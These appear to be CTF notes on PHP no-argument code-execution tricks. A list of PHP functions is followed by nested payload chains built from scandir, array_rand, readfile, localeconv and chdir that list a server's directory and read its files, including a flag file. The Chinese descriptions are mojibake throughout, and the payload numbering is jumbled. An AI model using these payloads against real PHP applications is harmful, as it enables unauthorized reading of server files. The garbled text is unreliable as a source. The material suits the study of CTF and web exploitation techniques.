еёёз”ЁеҮҪж•°

  • get_defined_functions() : жҳҫзӨәжүҖжңүеҮҪж•°
  • localeconv() : иҝ”еӣһдёҖдёӘеҢ…еҗ«жң¬ең°ж•°еӯ—еҸҠиҙ§еёҒж јејҸдҝЎжҒҜзҡ„ж•°з»„пјҢз¬¬дёҖдёӘе…ғзҙ дёәвҖҷ.вҖҷ
  • scandir() : иҝ”еӣһжҢҮе®ҡзӣ®еҪ•дёӯзҡ„ж–Үд»¶е’Ңзӣ®еҪ•зҡ„ж•°з»„
  • pos() : иҫ“еҮәеҪ“еүҚеҶ…йғЁжҢҮй’ҲжүҖжҢҮеҗ‘зҡ„е…ғзҙ 
  • current() : иҝ”еӣһж•°з»„еҪ“еүҚеҚ•е…ғпјҢеҗҢpos()
  • end() : е°ҶеҶ…йғЁжҢҮй’ҲжҢҮеҗ‘ж•°з»„дёӯзҡ„жңҖеҗҺдёҖдёӘе…ғзҙ пјҢе№¶иҫ“еҮәгҖӮ
  • next() : еҮҪж•°е°ҶеҶ…йғЁжҢҮй’ҲжҢҮеҗ‘ж•°з»„дёӯзҡ„дёӢдёҖдёӘе…ғзҙ пјҢе№¶иҫ“еҮә
  • file() : иҜ»еҸ–дёҖдёӘж–Үд»¶пјҢиҝ”еӣһзҡ„ж•°з»„дёӯе…ғзҙ еҜ№еә”жҜҸдёҖиЎҢзҡ„еҶ…е®№
  • readfile() : иҜ»еҸ–дёҖдёӘж–Үд»¶
  • sqrt() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„е№іж–№ж №
  • tan() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„жӯЈеҲҮеј§еәҰеҖј
  • atan() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„еҸҚжӯЈеҲҮеј§еәҰеҖј
  • cosh() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„еҸҢжӣІдҪҷејҰ
  • sinh() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„еҸҢжӣІжӯЈејҰ
  • ceil() : иҝ”еӣһеҗ‘дёҠеҸ–ж•ҙ
  • floor() : иҝ”еӣһеҗ‘дёӢеҸ–ж•ҙ
  • round() пјҡ иҝ”еӣһеӣӣиҲҚдә”е…ҘеҸ–ж•ҙ
  • chr() : иҝ”еӣһжҢҮе®ҡASCIIеҖјзҡ„еӯ—з¬Ұ
  • ord() : иҝ”еӣһеӯ—з¬ҰдёІдёӯз¬¬дёҖдёӘеӯ—з¬Ұ ASCIIеҖј
  • chdir() : ж”№еҸҳеҪ“еүҚзҡ„зӣ®еҪ•
  • localtime(timestamp,is_assoc) : еҸ–еҫ—жң¬ең°ж—¶й—ҙпјҢж•°з»„зҡ„з¬¬дёҖдёӘе…ғзҙ дёәз§’
  • time() : еҜ№еә”localtime()зҡ„timestamp
  • phpversion() : иҝ”еӣһphpзүҲжң¬еҸ·
  • crypt() : дҪҝз”ЁзӣҗеҖјз”ҹжҲҗHash
  • hebrevc() : еҸҚеҗ‘жҳҫзӨәеёҢдјҜжқҘеӯ—з¬Ұ
  • strrev() : еҸҚиҪ¬еӯ—з¬ҰдёІ
  • file() : жҠҠж•ҙдёӘж–Үд»¶иҜ»е…ҘдёҖдёӘж•°з»„дёӯ
  • array_reverse() : иҝ”еӣһзҝ»иҪ¬йЎәеәҸзҡ„ж•°з»„
  • array_flip() : еҸҚиҪ¬/дәӨжҚўж•°з»„дёӯзҡ„й”®еҗҚе’ҢеҜ№еә”е…іиҒ”зҡ„й”®еҖј
  • array_rand() : иҝ”еӣһдёҖдёӘеҢ…еҗ«йҡҸжңәй”®еҗҚзҡ„ж•°з»„

Payload0

  1. phpversion() #з”ЁдәҺиҫ“еҮәphpеҪ“еүҚзүҲжң¬дҝЎжҒҜ
  2. crypt(phpversion()) #еҠ еҜҶдҝЎжҒҜпјҢжңҖеҗҺдёҖдҪҚжңүеҸҜиғҪдёә.
  3. strrev(crypt(phpversion())) #еӯ—з¬ҰдёІйҖҶеәҸпјҢе°Ҷ.з§»еҠЁиҮіз¬¬дёҖдҪҚ
  4. ord(strrev(crypt(phpversion()))) #еҸ–з¬¬дёҖдҪҚзҡ„ASCIIз ҒеҖј
  5. chr(ord(strrev(crypt(phpversion())))) #иҪ¬дёәеӯ—з¬ҰпјҢй…ҚеҗҲдёҠдёҖжӯҘеҸҜд»ҘиҠӮйҖүеҮәз¬¬дёҖдҪҚзҡ„.
  6. scandir(chr(ord(strrev(crypt(phpversion()))))) #жү«жҸҸеҪ“еүҚзӣ®еҪ•
  7. array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))) #е°Ҷжү«жҸҸз»“жһңж•°з»„дәӨжҚўй”®еҗҚдёҺй”®еҖј
  8. array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))) #йҡҸжңәйҖүеҸ–ж•°з»„й”®еҗҚпјҢеҚійҡҸжңәйҖүеҸ–ж–Үд»¶еҗҚ
  9. readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))))) #иҜ»еҸ–ж–Үд»¶
  10. var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))) #иҫ“еҮәиҜ»еҸ–ж–Үд»¶з»“жһң

  5. array_rand(array_flip(scandir(pos(localeconv())))) #йҡҸжңәйҖүеҸ–ж•°з»„й”®еҗҚпјҢеҚійҡҸжңәйҖүеҸ–ж–Үд»¶еҗҚ

  11. end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #йҖүеҸ–жңҖеҗҺдёҖдёӘж–Үд»¶пјҢеҚіflagж–Үд»¶
